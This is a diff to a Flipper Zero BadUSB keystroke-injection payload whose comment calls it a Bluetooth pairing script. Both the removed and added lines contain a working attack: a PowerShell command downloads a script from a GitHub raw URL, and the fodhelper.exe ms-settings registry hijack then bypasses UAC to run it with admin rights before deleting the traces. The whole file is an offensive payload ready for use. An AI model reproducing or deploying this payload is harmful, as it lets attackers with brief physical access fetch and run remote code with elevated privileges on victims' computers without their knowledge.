@@ -1,5 +1,5 @@
 REM BadUSB Payload to Run Bluetooth Pairing Script with Admin Privileges
-REM Opens admin terminal, downloads script from GitHub, then runs with UAC bypass
+REM Minimal version for Flipper Zero: opens admin terminal, downloads and runs script with UAC bypass
 
 DELAY 2000
 GUI x
@@ -10,8 +10,5 @@ LEFT
 DELAY 500
 ENTER
 DELAY 3000
-STRING powershell -Command "New-Item -ItemType Directory -Path C:\temp -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'"
-ENTER
-DELAY 2000
-STRING powershell -Command "if (Test-Path 'C:\temp\badkb.ps1') { New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1''' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 30; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item 'C:\temp\badkb.ps1' -Force; Remove-Item 'C:\temp' -Force }"
+STRING powershell -Command "New-Item -ItemType Directory -Path C:\temp -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'; New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1''' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 15; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item 'C:\temp\badkb.ps1' -Force; Remove-Item 'C:\temp' -Force"
 ENTER
